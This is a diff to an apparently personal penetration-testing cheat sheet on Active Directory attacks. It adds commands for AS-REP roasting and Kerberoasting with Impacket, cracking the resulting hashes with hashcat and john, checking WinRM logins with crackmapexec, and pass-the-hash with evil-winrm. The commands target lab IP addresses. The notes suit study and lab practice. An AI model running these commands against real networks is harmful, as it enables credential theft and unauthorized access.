@@ -22,12 +22,17 @@ Attempt to get a list of TGTs for users that have the specific property "Do not 
 - If anything is discovered a John output will be generated for cracking
 {: .important }
 > Must have the domain added to your hosts file
-``` impacket-GetNPUsers domainname/ -no-pass -usersfile users ```
-> Once a TGT is obtain we crach the hash with john:
-> ```john hash --wordlist=/usr/share/wordlists/rockyou.txt```
+``` impacket-GetNPUsers domainname/ -no-pass -usersfile users 
+OR
+impacket-GetNPUsers domain.local/ -usersfile ValidUserList.txt -format hashcat -outputfile HashcatHashes -dc-ip 10.10.150.205
+```
+- Once a TGT is obtain we crach the hash with john:
+ ```john hash --wordlist=/usr/share/wordlists/rockyou.txt```
+- Or we have hashcat output - crack the hashes:
+```hashcat -a 0 -m 18200 HashcatHashes -o cracked.txt /usr/share/wordlists/rockyou.txt```
 - Now repeat further enumartion with any usernames and passwords for services requiring authentication (and recheck any SMB shares)
 
-Request a TGS Ticket (after SPN discovery - Impacket-GetUserSPNs, below)
+<b>Request a TGS Ticket</b> (after SPN discovery - Impacket-GetUserSPNs, below)
 ```impacket-GetUserSPNs -dc-ip 10.10.220.126 domain.local/username -request-user spn-name```
 - From this we will receive the TGS hash starting in '$krb5tgs$23$'
 - Crack this TGS hash with Hashcat - specifically -m13100
@@ -55,6 +60,9 @@ Request a TGS Ticket (after SPN discovery - Impacket-GetUserSPNs, below)
 - For Windows Remote Management functionality
 {: .important }
 > Credentials are required for Evil-WinRM (and the user have permissions)
+- Confirm a user can login via winrm with <b>crackmapexec</b>
+```crackmapexec winrm -u username -p 'password' -d domain.local 10.10.159.206```
+- Example:
 ```evil-winrm -u 'username' -i $IP```
 - Evil-WinRM accepts a user hash by using the -H flag
 ```evil-winrm -u 'Administrator' -i $IP -H 'c2597747aa5e43022a3a3049a3c3b09d'```
